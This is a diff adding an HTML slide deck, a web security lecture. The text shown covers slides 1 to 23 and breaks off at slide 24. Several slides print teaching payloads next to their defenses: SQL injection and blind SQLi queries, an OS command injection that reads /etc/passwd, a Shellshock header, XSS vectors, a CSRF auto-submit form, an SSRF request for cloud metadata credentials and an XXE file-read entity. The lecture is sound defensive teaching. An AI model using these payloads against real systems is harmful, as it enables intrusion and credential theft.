@@ -1,0 +1,1710 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Security: The Definitive Lecture (70 Slides)</title>
+    <style>
+        :root {
+            --primary: #0f172a;
+            --secondary: #b91c1c;
+            --accent: #2563eb;
+            --text-main: #334155;
+            --code-bg: #1e293b;
+            --success: #16a34a;
+            --warning: #d97706;
+            --bg-light: #f1f5f9;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #e2e8f0;
+            color: var(--text-main);
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        #presentation-container {
+            flex: 1;
+            position: relative;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .slide {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: white;
+            padding: 30px 45px;
+            display: none;
+            flex-direction: column;
+            overflow-y: auto;
+            opacity: 0;
+            transition: opacity 0.2s ease-in-out;
+        }
+
+        .slide.active { display: flex; opacity: 1; }
+
+        /* Typography */
+        h1 { font-size: 1.9rem; color: var(--primary); border-bottom: 3px solid var(--secondary); padding-bottom: 8px; margin-bottom: 15px; letter-spacing: -0.5px; }
+        h2 { font-size: 1.1rem; color: var(--primary); margin-bottom: 8px; margin-top: 10px; border-left: 4px solid var(--accent); padding-left: 10px; }
+        h3 { font-size: 0.9rem; color: var(--accent); margin-bottom: 4px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; }
+        p, li { font-size: 0.85rem; line-height: 1.4; margin-bottom: 4px; color: #475569; }
+        ul { list-style-type: none; padding-left: 5px; }
+        ul li { position: relative; padding-left: 15px; }
+        ul li::before { content: "▸"; color: var(--secondary); position: absolute; left: 0; top: 0; font-size: 0.6rem; }
+
+        /* Layouts */
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; align-items: start; margin-top: 8px; }
+        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; margin-top: 8px; }
+
+        /* Components */
+        .box { padding: 8px; border-radius: 4px; margin-bottom: 6px; border: 1px solid #e2e8f0; font-size: 0.8rem; }
+        .box-info { background: #eff6ff; border-left: 3px solid var(--accent); }
+        .box-warn { background: #fef2f2; border-left: 3px solid var(--secondary); }
+        .box-case { background: #fffbeb; border-left: 3px solid var(--warning); }
+        .case-title { font-weight: 800; color: #92400e; display: block; margin-bottom: 2px; font-size: 0.8rem; }
+        
+        /* Code Blocks */
+        pre {
+            background-color: var(--code-bg);
+            color: #cbd5e1;
+            padding: 8px;
+            border-radius: 4px;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.7rem;
+            overflow-x: auto;
+            border: 1px solid #334155;
+        }
+        .vuln { color: #f87171; } .safe { color: #4ade80; } .key { color: #c084fc; }
+        .str { color: #4ade80; } .cmt { color: #64748b; font-style: italic; }
+        .fn { color: #60a5fa; }
+
+        /* Simulation Tables */
+        .sim-table { width: 100%; border-collapse: collapse; font-size: 0.65rem; margin-top: 4px; background: white; }
+        .sim-table th { background: #f1f5f9; color: #334155; padding: 4px; text-align: left; font-weight: 700; border-bottom: 2px solid #cbd5e1; }
+        .sim-table td { padding: 4px; border-bottom: 1px solid #e2e8f0; font-family: 'Fira Code', monospace; color: #475569; }
+        .sim-step { color: var(--accent); font-weight: bold; width: 8px; text-align: center; background: #eff6ff; }
+        .sim-attack { color: var(--secondary); font-weight: bold; }
+        .sim-defense { color: var(--success); font-weight: bold; }
+
+        /* Diagrams */
+        .diagram-container { display: flex; justify-content: center; align-items: center; padding: 5px; background: white; border-radius: 4px; margin: 5px 0; }
+        svg { max-width: 100%; height: auto; }
+        svg text { font-family: 'Inter', sans-serif; font-size: 9px; fill: #334155; }
+        
+        /* Navigation */
+        #footer {
+            height: 30px; background-color: var(--primary); color: white;
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 0 25px; border-top: 1px solid #334155;
+        }
+        .nav-btn { background: transparent; color: white; border: 1px solid rgba(255,255,255,0.2); padding: 2px 10px; border-radius: 15px; cursor: pointer; font-weight: bold; font-size: 0.6rem; }
+        .nav-btn:hover { background: white; color: var(--primary); }
+        .nav-btn:disabled { opacity: 0.2; cursor: not-allowed; }
+        #slide-counter { font-family: 'Fira Code', monospace; font-size: 0.65rem; opacity: 0.6; }
+
+        @media (max-width: 1024px) {
+            .grid-2, .grid-3 { grid-template-columns: 1fr; gap: 8px; }
+            .slide { padding: 12px; }
+            h1 { font-size: 1.3rem; }
+            pre { font-size: 0.6rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="presentation-container">
+        
+        <!-- Slide 1: Title -->
+        <div class="slide active">
+            <div style="display:flex; flex-direction:column; justify-content:center; height:100%; text-align:center; background:var(--primary); color:white;">
+                <h1 style="color:white; border:none; font-size:3rem;">Web Security Fundamentals</h1>
+                <h2 style="color:var(--secondary); border:none; margin-bottom:20px; font-weight:300;">The Definitive Master Lecture</h2>
+                <p style="color:#94a3b8;">70 Comprehensive Slides • Attacks • Defenses • Code Analysis</p>
+                <div style="margin-top:40px; color:#64748b; font-size:0.8rem;">
+                    <p>Press <kbd style="background:#334155; padding:2px 6px; border-radius:4px;">Space</kbd> to begin</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 2: Landscape -->
+        <div class="slide">
+            <h1>The Modern Threat Landscape</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Real-World Impact Analysis</h3>
+                    <div class="box box-warn">
+                        <h3>Case Study: Equifax (2017)</h3>
+                        <p><strong>Vector:</strong> Apache Struts RCE (CVE-2017-5638).</p>
+                        <p><strong>Root Cause:</strong> Failure to patch a known vulnerability within 48 hours of disclosure.</p>
+                        <p><strong>Technical Detail:</strong> Jakarta Multipart parser allowed OGNL expression execution via malformed Content-Type header.</p>
+                    </div>
+                </div>
+                <div>
+                    <h3>OWASP Top 10 (2021) Shift</h3>
+                    <p>Focus has moved from implementation errors to design flaws.</p>
+                    <ol style="padding-left:15px; line-height:1.3; font-size:0.75rem;">
+                        <li><strong>A01 Broken Access Control</strong> (Moved from #5)</li>
+                        <li><strong>A02 Cryptographic Failures</strong></li>
+                        <li><strong>A03 Injection</strong></li>
+                        <li><strong>A04 Insecure Design</strong> (New Category)</li>
+                        <li><strong>A05 Security Misconfiguration</strong></li>
+                        <li><strong>A06 Vulnerable Components</strong></li>
+                        <li><strong>A07 Auth Failures</strong></li>
+                        <li><strong>A08 Software & Data Integrity</strong> (Supply Chain)</li>
+                        <li><strong>A09 Logging Failures</strong></li>
+                        <li><strong>A10 SSRF</strong></li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 3: Security Principles -->
+        <div class="slide">
+            <h1>Core Security Principles (CIA)</h1>
+            <div class="grid-3">
+                <div class="box box-info">
+                    <h3>Confidentiality</h3>
+                    <p>Data accessible only to authorized users.</p>
+                    <p><em>Ex:</em> Encryption, Access Control.</p>
+                </div>
+                <div class="box box-info">
+                    <h3>Integrity</h3>
+                    <p>Data accuracy and trustworthiness.</p>
+                    <p><em>Ex:</em> Hashing, Digital Signatures.</p>
+                </div>
+                <div class="box box-info">
+                    <h3>Availability</h3>
+                    <p>Reliable access to resources.</p>
+                    <p><em>Ex:</em> DDoS Mitigation, Redundancy.</p>
+                </div>
+            </div>
+            <h2>Defense in Depth (Layered Security)</h2>
+            <div class="diagram-container" style="height: 120px; background:white; border:none;">
+                <svg width="600" height="120" viewBox="0 0 600 120">
+                    <rect x="0" y="0" width="600" height="120" fill="#f8fafc" stroke="#e2e8f0"/>
+                    <rect x="20" y="15" width="560" height="85" fill="#e0f2fe" stroke="#0ea5e9" rx="10"/>
+                    <text x="50" y="35" font-size="9" fill="#0369a1">Layer 1: Edge Security (WAF, DDoS, CDN)</text>
+                    <rect x="50" y="45" width="500" height="45" fill="#fef3c7" stroke="#f59e0b" rx="10"/>
+                    <text x="80" y="65" font-size="9" fill="#92400e">Layer 2: App Security (Code, Auth, Session)</text>
+                    <rect x="80" y="75" width="440" height="15" fill="#dcfce7" stroke="#16a34a" rx="5"/>
+                    <text x="110" y="86" font-size="8" fill="#166534">Layer 3: Data Security (Encryption, RBAC)</text>
+                </svg>
+            </div>
+        </div>
+
+        <!-- Slide 4: HTTP Anatomy -->
+        <div class="slide">
+            <h1>HTTP Request: The Attack Surface Map</h1>
+            <div class="grid-2">
+                <div>
+                    <pre>
+<span class="key">POST</span> /search?q=<span class="vuln">test</span> <span class="key">HTTP/1.1</span>
+<span class="fn">Host:</span> target.com
+<span class="fn">User-Agent:</span> Mozilla/5.0
+<span class="fn">X-Forwarded-For:</span> <span class="vuln">127.0.0.1</span>
+<span class="fn">Cookie:</span> session=<span class="vuln">eyJhbG...</span>
+
+{ "user": "<span class="vuln">admin</span>" }
+                    </pre>
+                </div>
+                <div>
+                    <h3>Vector Mapping</h3>
+                    <table class="sim-table">
+                        <tr><th>Component</th><th>Vector</th><th>Example Attack</th></tr>
+                        <tr><td>Path</td><td>Traversal</td><td>/../../etc/passwd</td></tr>
+                        <tr><td>Query Param</td><td>Injection</td><td>SQLi, XSS, SSTI</td></tr>
+                        <tr><td>Host Header</td><td>Cache Poisoning</td><td>Host: evil.com</td></tr>
+                        <tr><td>X-Forwarded-For</td><td>Access Bypass</td><td>Spoofing Internal IP</td></tr>
+                        <tr><td>Cookie</td><td>State Tampering</td><td>JWT None Algo</td></tr>
+                        <tr><td>Body</td><td>Mass Assignment</td><td>"role": "admin"</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 5: Browser Security -->
+        <div class="slide">
+            <h1>Browser Security Model: SOP & CORS</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Same-Origin Policy (SOP)</h3>
+                    <p>Prevents <code>evil.com</code> from reading data from <code>bank.com</code>.</p>
+                    <pre>
+Origin = Scheme + Host + Port
+
+https://site.com vs http://site.com ❌
+https://site.com vs https://api.site.com ❌
+                    </pre>
+                </div>
+                <div>
+                    <h3>CORS Misconfiguration Simulation</h3>
+                    <table class="sim-table">
+                        <tr><th>Step</th><th>Action</th><th>Result</th></tr>
+                        <tr><td class="sim-step">1</td><td>Attacker sends request from evil.com</td><td class="sim-attack">Origin: evil.com</td></tr>
+                        <tr><td class="sim-step">2</td><td>Server reflects Origin blindly</td><td class="sim-attack">Access-Control-Allow-Origin: evil.com</td></tr>
+                        <tr><td class="sim-step">3</td><td>Server allows Credentials</td><td class="sim-attack">Access-Control-Allow-Credentials: true</td></tr>
+                        <tr><td class="sim-step">4</td><td>Browser grants access</td><td class="sim-attack">JS reads user data</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 6: Session Fixation -->
+        <div class="slide">
+            <h1>Attack Vector: Session Fixation</h1>
+            <div class="diagram-container" style="height: 220px;">
+                <svg width="700" height="220" viewBox="0 0 700 220">
+                    <defs>
+                        <marker id="arrow" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#64748b" /></marker>
+                        <marker id="arrow-red" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#dc2626" /></marker>
+                    </defs>
+                    <rect x="20" y="15" width="80" height="30" fill="#dc2626" rx="5"/>
+                    <text x="60" y="35" text-anchor="middle" fill="white" font-weight="bold" font-size="9">Attacker</text>
+                    <rect x="20" y="175" width="80" height="30" fill="#2563eb" rx="5"/>
+                    <text x="60" y="195" text-anchor="middle" fill="white" font-weight="bold" font-size="9">Victim</text>
+                    <rect x="300" y="95" width="100" height="30" fill="#f1c40f"/>
+                    <text x="350" y="115" text-anchor="middle" font-size="9">Server</text>
+
+                    <path d="M60,45 L60,75 L300,100" stroke="#dc2626" stroke-width="2" fill="none" marker-end="url(#arrow-red)"/>
+                    <text x="170" y="70" font-size="9" fill="#dc2626">1. Gets SID: "SESS=FIXED"</text>
+                    
+                    <path d="M60,175 L60,145 L300,115" stroke="#2563eb" stroke-width="2" fill="none" marker-end="url(#arrow)"/>
+                    <text x="100" y="160" font-size="9" fill="#2563eb">2. Clicks Link: bank.com?SID=FIXED</text>
+
+                    <path d="M300,125 L300,155 L80,180" stroke="#f1c40f" stroke-width="2" fill="none" marker-end="url(#arrow)"/>
+                    <text x="200" y="165" font-size="9">3. Logs in (Server accepts SID)</text>
+
+                    <path d="M100,45 L350,90" stroke="#dc2626" stroke-width="2" stroke-dasharray="4" fill="none" marker-end="url(#arrow-red)"/>
+                    <text x="240" y="55" font-size="9" fill="#dc2626">4. Access with SID: "FIXED"</text>
+                </svg>
+            </div>
+            <div class="box box-info"><strong>Defense:</strong> Regenerate Session ID immediately after successful authentication.</div>
+        </div>
+
+        <!-- Slide 7: SQLi Deep Dive -->
+        <div class="slide">
+            <h1>Deep Dive: SQL Injection Mechanics</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>The Vulnerable Code Flow</h3>
+                    <pre>
+<span class="cmt">// Java Backend</span>
+String query = <span class="str">"SELECT * FROM users 
+               WHERE username = '"</span> + req.getParameter("user") + <span class="str">"'"</span>;
+stmt.execute(query);
+                    </pre>
+                    <h3>Injection Payload</h3>
+                    <pre>
+user = <span class="vuln">admin'--</span>
+                    </pre>
+                    <h3>Resulting Query</h3>
+                    <pre>
+SELECT * FROM users WHERE username = <span class="str">'admin'</span><span class="vuln">--'</span>
+                    </pre>
+                    <p>The <code>--</code> comments out the password check.</p>
+                </div>
+                <div>
+                    <h3>Parser State Machine</h3>
+                    <table class="sim-table">
+                        <tr><th>Input Char</th><th>Parser State</th><th>Result</th></tr>
+                        <tr><td>admin</td><td>Inside String Literal</td><td>Normal</td></tr>
+                        <tr><td>'</td><td>Closes Literal</td><td class="sim-attack">Breaks Context</td></tr>
+                        <tr><td>--</td><td>Comment Start</td><td class="sim-attack">Ignores Logic</td></tr>
+                    </table>
+                    <div class="box box-info">
+                        <h3>Why it works</h3>
+                        <p>The database parser compiles the string *after* concatenation, treating user input as code.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 8: Blind SQLi Logic -->
+        <div class="slide">
+            <h1>Simulation: Blind SQLi (Boolean Based)</h1>
+            <p>Extracting data without visual output by observing boolean responses.</p>
+            <div class="grid-2">
+                <div>
+                    <h3>The Logic Gate</h3>
+                    <pre>
+Payload: 
+id=1 AND (SELECT SUBSTRING(password,1,1) 
+          FROM users WHERE username='admin') = 'a'
+                    </pre>
+                </div>
+                <div>
+                    <h3>Extraction Step-by-Step</h3>
+                    <table class="sim-table">
+                        <tr><th>Attempt</th><th>Condition</th><th>Response</th><th>Deduction</th></tr>
+                        <tr><td>1</td><td>char == 'a'</td><td>False (Normal Page)</td><td>Not 'a'</td></tr>
+                        <tr><td>...</td><td>...</td><td>...</td><td>...</td></tr>
+                        <tr><td>5</td><td>char == 's'</td><td><span class="sim-defense">True (Diff Page)</span></td><td><strong>First char is 's'</strong></td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 9: Time-Based SQLi -->
+        <div class="slide">
+            <h1>Simulation: Time-Based Blind SQLi</h1>
+            <p>Used when boolean responses are indistinguishable.</p>
+            <div class="grid-2">
+                <div>
+                    <pre>
+<span class="cmt">// MySQL Payload</span>
+id=1 AND IF(ASCII(SUBSTRING(version(),1,1))=53, SLEEP(5), 0);
+                    </pre>
+                </div>
+                <div>
+                    <table class="sim-table">
+                        <tr><th>Time</th><th>Observation</th><th>Inference</th></tr>
+                        <tr><td>0.01s</td><td>Response immediate.</td><td>ASCII char is NOT 53.</td></tr>
+                        <tr><td>5.10s</td><td>Response delayed.</td><td class="sim-defense">ASCII char IS 53 ('5').</td></tr>
+                    </table>
+                    <p>Allows data extraction even if page content never changes.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 10: SQLi Defense -->
+        <div class="slide">
+            <h1>Defense: How Parameterized Queries Work</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Secure Implementation</h3>
+                    <pre>
+PreparedStatement stmt = conn.prepareStatement(
+    <span class="str">"SELECT * FROM users WHERE id = ?"</span>
+);
+stmt.setString(1, userInput);
+                    </pre>
+                </div>
+                <div>
+                    <h3>Internal Compilation Flow</h3>
+                    <div class="diagram-container" style="background:white; border:none; height:130px;">
+                        <svg width="350" height="130" viewBox="0 0 350 130">
+                            <rect x="10" y="10" width="330" height="30" fill="#eff6ff" stroke="#2563eb"/>
+                            <text x="175" y="30" text-anchor="middle" font-size="8">1. Pre-compile SQL Skeleton</text>
+                            <rect x="10" y="50" width="330" height="30" fill="#f1f5f9" stroke="#64748b"/>
+                            <text x="175" y="70" text-anchor="middle" font-size="8">2. Send User Input Separately</text>
+                            <rect x="10" y="90" width="330" height="30" fill="#dcfce7" stroke="#16a34a"/>
+                            <text x="175" y="110" text-anchor="middle" font-size="8">3. Engine Treats Input as Literal Data</text>
+                        </svg>
+                    </div>
+                    <p><strong>Key:</strong> The structure is fixed before data is introduced.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 11: Command Injection -->
+        <div class="slide">
+            <h1>Attack Vector: OS Command Injection</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Vulnerable Code</h3>
+                    <pre>
+<span class="cmt">// C Binary</span>
+system("ping " + ip_address);
+                    </pre>
+                    <h3>Payload</h3>
+                    <pre>
+<span class="vuln">127.0.0.1; cat /etc/passwd</span>
+                    </pre>
+                </div>
+                <div class="box box-case">
+                    <span class="case-title">Real-World: Shellshock (2014)</span>
+                    <p>Vulnerability in Bash environment variable processing.</p>
+                    <pre>
+HTTP Header: 
+User-Agent: () { :; }; <span class="vuln">/bin/bash -c "cat /etc/passwd"</span>
+                    </pre>
+                    <p>Executed on every CGI script using Bash.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 12: XSS Types -->
+        <div class="slide">
+            <h1>Cross-Site Scripting (XSS) Taxonomy</h1>
+            <div class="grid-3">
+                <div class="box box-warn">
+                    <h3>Reflected</h3>
+                    <p>Malicious script is embedded in a URL link.</p>
+                    <p><em>Requires:</em> Social Engineering.</p>
+                </div>
+                <div class="box" style="background:#fef2f2; border-color:#b91c1c;">
+                    <h3>Stored (Persistent)</h3>
+                    <p>Script is saved in the Database.</p>
+                    <p><em>Impact:</em> Affects all visitors.</p>
+                </div>
+                <div class="box box-info">
+                    <h3>DOM-Based</h3>
+                    <p>Flaw in client-side JavaScript logic.</p>
+                    <p><em>Source:</em> Never touches server.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 13: XSS Flow Diagram -->
+        <div class="slide">
+            <h1>Attack Vector: Stored XSS Flow</h1>
+            <div class="diagram-container" style="height: 240px;">
+                <svg width="700" height="240" viewBox="0 0 700 240">
+                    <rect x="20" y="15" width="80" height="30" fill="#dc2626" rx="5"/>
+                    <text x="60" y="35" text-anchor="middle" fill="white" font-weight="bold" font-size="9">Attacker</text>
+                    <rect x="300" y="80" width="100" height="30" fill="#f1c40f"/>
+                    <text x="350" y="100" text-anchor="middle" font-size="9">Web App</text>
+                    <path d="M550,50 h80 v60 h-80 z M550,50 c0,-15 80,-15 80,0" fill="#2563eb" stroke="#333" stroke-width="2"/>
+                    <text x="590" y="90" text-anchor="middle" fill="white" font-size="8">Database</text>
+                    <rect x="20" y="185" width="80" height="30" fill="#16a34a" rx="5"/>
+                    <text x="60" y="205" text-anchor="middle" fill="white" font-weight="bold" font-size="9">Victim</text>
+
+                    <path d="M60,45 L60,60 L300,85" stroke="#dc2626" stroke-width="2" fill="none"/>
+                    <text x="140" y="65" font-size="9">1. Submit: &lt;script&gt;...&lt;/script&gt;</text>
+                    
+                    <path d="M400,95 L550,85" stroke="#333" stroke-width="2" fill="none"/>
+                    <text x="470" y="80" font-size="9">2. Store</text>
+
+                    <path d="M60,185 L60,150 L300,100" stroke="#2563eb" stroke-width="2" fill="none"/>
+                    <text x="100" y="170" font-size="9">3. View Page</text>
+
+                    <path d="M350,110 L550,90" stroke="#333" stroke-width="2" fill="none" stroke-dasharray="4"/>
+                    <text x="480" y="115" font-size="9">4. Fetch Data</text>
+
+                    <path d="M350,115 L350,170 L100,200" stroke="#dc2626" stroke-width="2" fill="none"/>
+                    <text x="200" y="220" font-size="9" fill="#dc2626">5. Render Script (Cookie Stolen)</text>
+                </svg>
+            </div>
+        </div>
+
+        <!-- Slide 14: XSS Real World -->
+        <div class="slide">
+            <h1>Case Study: Samy Worm (2005)</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Self-Propagating XSS</h3>
+                    <pre>
+&lt;div id="mycode"&gt;
+  expr="alert('haxxed')"
+  style="background:url('javascript:eval...')"
+&lt;/div&gt;
+                    </pre>
+                </div>
+                <div>
+                    <h3>Viral Logic Simulation</h3>
+                    <table class="sim-table">
+                        <tr><th>Step</th><th>Action</th></tr>
+                        <tr><td class="sim-step">1</td><td>Victim views Samy's profile.</td></tr>
+                        <tr><td class="sim-step">2</td><td>Script runs: "Add Samy as friend".</td></tr>
+                        <tr><td class="sim-step">3</td><td>Script runs: "Copy payload to my profile".</td></tr>
+                        <tr><td class="sim-result">Result</td><td>Exponential Infection (1M in 20h).</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 15: XSS Contexts -->
+        <div class="slide">
+            <h1>Technical Simulation: Context-Aware XSS</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>1. HTML Context</h3>
+                    <pre>
+&lt;div&gt;<span class="vuln">&lt;script&gt;alert(1)&lt;/script&gt;</span>&lt;/div&gt;
+                    </pre>
+                    <h3>2. Attribute Context</h3>
+                    <pre>
+&lt;input value="<span class="vuln">" onfocus="alert(1)" autofocus</span>"&gt;
+                    </pre>
+                    <h3>3. JavaScript Context</h3>
+                    <pre>
+&lt;script&gt;
+var x = '<span class="vuln">'--!&gt;alert(1)</span>';
+&lt;/script&gt;
+                    </pre>
+                </div>
+                <div>
+                    <h3>Defense: Encoding</h3>
+                    <table class="sim-table">
+                        <tr><th>Context</th><th>Encoding Method</th></tr>
+                        <tr><td>HTML Body</td><td>HTML Entity Encoding (&amp;lt;)</td></tr>
+                        <tr><td>Attribute</td><td>Attribute Encoding (&amp;quot;)</td></tr>
+                        <tr><td>JavaScript</td><td>Unicode Escape (\u0027)</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 16: CSP Deep Dive -->
+        <div class="slide">
+            <h1>Defense: Content Security Policy (CSP)</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Implementation</h3>
+                    <pre>
+Content-Security-Policy: 
+  default-src 'self';
+  script-src 'self' https://cdn.trusted.com;
+  object-src 'none';
+                    </pre>
+                </div>
+                <div>
+                    <h3>Operational Logic</h3>
+                    <table class="sim-table">
+                        <tr><th>Injection Attempt</th><th>Browser Action</th></tr>
+                        <tr><td>&lt;script&gt;alert(1)&lt;/script&gt;</td><td class="sim-defense">Blocked (Inline)</td></tr>
+                        <tr><td>&lt;script src="evil.com"&gt;</td><td class="sim-defense">Blocked (Origin)</td></tr>
+                        <tr><td>&lt;script src="cdn.trusted.com"&gt;</td><td class="sim-attack">Allowed (Whitelisted)</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 17: CSRF Mechanics -->
+        <div class="slide">
+            <h1>Attack Vector: CSRF (Cross-Site Request Forgery)</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Attack Code (evil.com)</h3>
+                    <pre>
+&lt;form action="bank.com/transfer" method="POST" id="steal"&gt;
+  &lt;input type="hidden" name="to" value="attacker" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById("steal").submit();&lt;/script&gt;
+                    </pre>
+                </div>
+                <div>
+                    <h3>Execution Flow</h3>
+                    <table class="sim-table">
+                        <tr><th>Step</th><th>Action</th><th>Result</th></tr>
+                        <tr><td class="sim-step">1</td><td>User logs into bank.com</td><td class="sim-defense">Cookie: session=valid</td></tr>
+                        <tr><td class="sim-step">2</td><td>User visits evil.com</td><td class="sim-attack">Hidden form submits to bank</td></tr>
+                        <tr><td class="sim-step">3</td><td>Browser processes request</td><td class="sim-attack">Attaches bank cookies automatically</td></tr>
+                        <tr><td class="sim-step">4</td><td>Bank receives request</td><td class="sim-attack">Valid session, processes transfer</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 18: CSRF Defense -->
+        <div class="slide">
+            <h1>CSRF Defense Implementation</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Anti-CSRF Token</h3>
+                    <pre>
+&lt;input type="hidden" name="token" value="<span class="safe">{random_hash}</span>" /&gt;
+                    </pre>
+                    <p>Server validates token. Attacker cannot read it due to SOP.</p>
+                </div>
+                <div>
+                    <h3>SameSite Cookies</h3>
+                    <pre>
+Set-Cookie: session=abc; <span class="safe">SameSite=Strict</span>;
+                    </pre>
+                    <p>Browser blocks cookie on cross-site requests.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 19: IDOR Diagram -->
+        <div class="slide">
+            <h1>Attack Vector: IDOR (Insecure Direct Object Reference)</h1>
+            <div class="diagram-container" style="height: 200px;">
+                <svg width="600" height="200" viewBox="0 0 600 200">
+                    <rect x="20" y="80" width="80" height="30" fill="#dc2626" rx="5"/>
+                    <text x="60" y="100" text-anchor="middle" fill="white" font-weight="bold" font-size="9">Attacker</text>
+                    <rect x="250" y="80" width="100" height="30" fill="#f1c40f"/>
+                    <text x="300" y="100" text-anchor="middle" font-size="9">API Server</text>
+                    <path d="M420,50 h80 v100 h-80 z M420,50 c0,-15 80,-15 80,0" fill="#2563eb" stroke="#333" stroke-width="2"/>
+                    <text x="460" y="110" text-anchor="middle" fill="white" font-size="8">DB</text>
+
+                    <path d="M100,95 L250,95" stroke="#dc2626" stroke-width="2" marker-end="url(#arrow-red)"/>
+                    <text x="170" y="88" font-size="9" fill="#dc2626">GET /api/messages/1002</text>
+                    
+                    <path d="M350,95 L420,95" stroke="#333" stroke-width="2" marker-end="url(#arrow)"/>
+                    <text x="380" y="88" font-size="8">SELECT * WHERE id=1002</text>
+
+                    <path d="M350,105 L100,105" stroke="#16a34a" stroke-width="2" fill="none" marker-end="url(#arrow)"/>
+                    <text x="200" y="125" font-size="9" fill="#16a34a">Returns Victim's Data!</text>
+                </svg>
+            </div>
+            <div class="box box-warn"><strong>Fix:</strong> Check <code>if (current_user.id == object.owner_id)</code>.</div>
+        </div>
+
+        <!-- Slide 20: SSRF Deep Dive -->
+        <div class="slide">
+            <h1>Attack Vector: SSRF (Server-Side Request Forgery)</h1>
+            <div class="grid-2">
+                <div class="box box-case">
+                    <span class="case-title">Real-World: Capital One (2019)</span>
+                    <pre>
+POST /api/fetch
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+                    </pre>
+                    <p>Server accessed AWS metadata and returned credentials to attacker.</p>
+                </div>
+                <div>
+                    <h3>Defense</h3>
+                    <ul>
+                        <li>Whitelist allowed domains.</li>
+                        <li>Block private IP ranges (RFC 1918).</li>
+                        <li>Disable HTTP redirects.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 21: XXE -->
+        <div class="slide">
+            <h1>Attack Vector: XXE (XML External Entity)</h1>
+            <div class="grid-2">
+                <div>
+                    <pre>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM <span class="vuln">"file:///etc/passwd"</span>&gt;
+]&gt;
+&lt;root&gt;&xxe;&lt;/root&gt;
+                    </pre>
+                </div>
+                <div>
+                    <h3>Parser Simulation</h3>
+                    <table class="sim-table">
+                        <tr><th>Step</th><th>Action</th></tr>
+                        <tr><td class="sim-step">1</td><td>Parser reads DOCTYPE.</td></tr>
+                        <tr><td class="sim-step">2</td><td>Defines entity "xxe" as file content.</td></tr>
+                        <tr><td class="sim-step">3</td><td>Parses &lt;root&gt; body.</td></tr>
+                        <tr><td class="sim-result">4</td><td>Replaces &xxe; with /etc/passwd content.</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 22: Deserialization -->
+        <div class="slide">
+            <h1>Attack Vector: Insecure Deserialization</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Java RCE Simulation</h3>
+                    <pre>
+<span class="cmt">// ObjectInputStream reads bytes</span>
+Object obj = input.readObject();
+<span class="cmt">// If obj is malicious class, constructor runs.</span>
+                    </pre>
+                </div>
+                <div class="box box-case">
+                    <span class="case-title">Real-World: WebLogic RCEs</span>
+                    <p>Attackers send serialized objects via T3 protocol to execute commands on the server.</p>
+                    <p><strong>Tool:</strong> <code>ysoserial</code></p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 23: Crypto Failures -->
+        <div class="slide">
+            <h1>Cryptographic Failures</h1>
+            <div class="grid-2">
+                <div class="box box-warn">
+                    <h3>Common Flaws</h3>
+                    <ul>
+                        <li>Cleartext storage/transmission.</li>
+                        <li>Weak algorithms (MD5, SHA1).</li>
+                        <li>Hardcoded keys in git.</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3>Password Storage</h3>
+                    <pre>
+<span class="cmt">// Good</span>
+bcrypt(password, 12);
+
+<span class="cmt">// Bad</span>
+MD5(password + salt);
+AES_Encrypt(password, key);
+                    </pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 24: TLS 1.3 -->
+        <div class="slide">
+            <h1>Protocol Security: TLS 1.3 Handshake</h1>
+            <div class="diagram-container" style="background:white; border:none; height:150px;">
